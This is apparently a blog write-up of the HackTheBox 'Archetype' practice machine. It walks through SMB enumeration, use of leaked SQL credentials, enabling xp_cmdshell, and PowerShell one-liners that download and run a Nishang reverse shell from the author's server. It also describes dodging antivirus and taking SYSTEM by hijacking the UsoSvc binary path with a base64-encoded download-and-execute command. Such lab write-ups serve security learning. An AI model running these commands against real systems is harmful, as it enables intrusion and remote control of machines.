---
layout: single
title: HackTheBox - Archetype Writeup
permalink: /hackthebox-archetype-writeup/
excerpt: "Starting Point Machine"
classes: wide
header:
  teaser: "/assets/images/htb/archetype/archetype.png"
  teaser_home_page: true  
categories:
  - hackthebox
  - starting-point
  - windows
  - infosec
  - writeup
tags:
  - reverse-powershell
  - legacy 
---



![hackthebox archetype title card](/assets/images/htb/archetype/archetype.png)

_This is machine from starting point series_ <br>
_You can download official pdf file to view the walkthrough_

# <u>1:Enumeration</u>

- 1000 ports scan

```sql
nmap -sC -sV -oN nmap/initial 10.10.10.27
```

![1](/assets/images/htb/archetype/1.png)

- all ports scan

![2](/assets/images/htb/archetype/2.png)

## <u>Open ports</u>
- 135 (msrpc)
- 139 (smb 4 sure)
- 445 (smb 4 sure)
- 1433 (ms-sql-s/Microsoft SQL Server)

# <u>SMB Enum</u>

## <u>CrackMapEXEC</u>

![3](/assets/images/htb/archetype/3.png)

## <u>smbclient</u>

![4](/assets/images/htb/archetype/4.png)

wow `backups` shares. Let's try connect to it.

![5](/assets/images/htb/archetype/5.png)

- download the file using the `get command`

# <u>prod.dtsConfig</u>
- content of the file

```perl
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```
we've got the credentials

- `ARCHETYPE\sql_svc:M3g4c0rp123`

# <u>2:Foothold/Gaining Access</u>

# <u>mssqlclient.py[Impacket]</u>

- mssqlclient syntax

```bash
mssqlclient.py <UserID>@<IP addr> -windows-auth
```

![6](/assets/images/htb/archetype/6.png)

- always do this after login `enable_xp_cmdshell`
- let's try run `whoami`

![7](/assets/images/htb/archetype/7.png)

- Note: I'm using `xp_cmdshell` then `whoami`

# <u>Nishang</u>

> [Nishang](https://github.com/samratashok/nishang) is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.

- I'm gonna copy the `Invoke-PowerShellTcp.ps1` into my `www` directory. Then, rename it to `rev.ps1`

![8](/assets/images/htb/archetype/8.png)

- Open the `rev.ps1` file and pick one of the example. Then `copy` and `paste` it on the last line of the code.

> Make sure! change the ip and port.


![9](/assets/images/htb/archetype/9.png) _examples_

![10](/assets/images/htb/archetype/10.png) <br>_put in here and save it_

- Time to upload the script into the machine by using `mssqlclient.py` that we connected.
	-	I'm gonna run `python server` inside `www` directory.
	-	`python3 -m http.server`
	- Then try to uploaded using this command:
		- `xp_cmdshell powershell IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.16.13:8000/rev.ps1\")`  
	- And this happen

![11](/assets/images/htb/archetype/11.png) <br>  _it says this script got blocked by antivirus because of this function_

- So, I change the function into something else. It works.


![12](/assets/images/htb/archetype/12.png)

# <u>User flag</u>

![14](/assets/images/htb/archetype/14.png)

# <u>WinPEAS</u>

- Upload the winpeas binary into the machine
- I'm gonna use `powershell` to know this machine `architecture`
  - by using this command:
    - `(wmic os get OSArchitecture)[2]`

![13](/assets/images/htb/archetype/13.png)

- This machine is 64-bit. I'm gonna upload `WinPEAS 64-bit version` to work.

- I'm gonna `copy` and `paste` the `WinPEAS` binary into my `www` folder.
- Let's upload it by using this command:
    - `IWR http://10.10.16.13:8000/winPEASx64.exe -OutFile winpeas.exe`

![15](/assets/images/htb/archetype/15.png)

- Then run it by using this command `.\winpeas.exe`

# <u>3:Privilege Escalation</u>

# <u>UsoSvc</u>

- `WinPEAS` just found this juicy stuff:

![16](/assets/images/htb/archetype/16.png)

## <u>Modify service binary path</u>
- According this [link](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services)
> If the group "Authenticated users" has *<font color="red">SERVICE\_ALL\_ACCESS</font>* in a service, then it can <font color="yellow">modify the binary</font> that is being executed by the service.

---

## <u>Encoded Command</u>
-  Here is the script before Encoded
```powershell
IEX(IWR http://10.10.16.13:8000/zzz.ps1 -UseBasicParsing)
```
- Time to encoded
```bash
echo "IEX(IWR http://10.10.16.13:8000/zzz.ps1 -UseBasicParsing)" | iconv -t utf-16le | base64 -w 0
```
- First, It's gonna encoded into `utf-16le`
- Second, It's gonna encoded into `base64`
- Sources [IppSec](https://youtu.be/iyYqgseKUPM?t=2299)

---

- So, I'm gonna `copy` another `powershell reverse shell` by name it into `zzz.ps1`
- Then upload it using this command:
```powershell
sc.exe config UsoSvc binpath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMQAzADoAOAAwADAAMAAvAHoAegB6AC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA="
```

- After that, run this command `sc.exe start UsoSvc`

![17](/assets/images/htb/archetype/17.png)


![18](/assets/images/htb/archetype/18.png) <br> _we've got the reverse shell and become system!_

# <u>Administrator Flag</u>

![19](/assets/images/htb/archetype/19.png)

# <u>4:Conclusion</u>
I’ve learned a lot of tools today and `how to do a PowerShell reverse shell`. Ngl, this is a really fun box. I feel like my brain want to explode

I have a fun time doing this machine and I hope you guys too. Bye ;)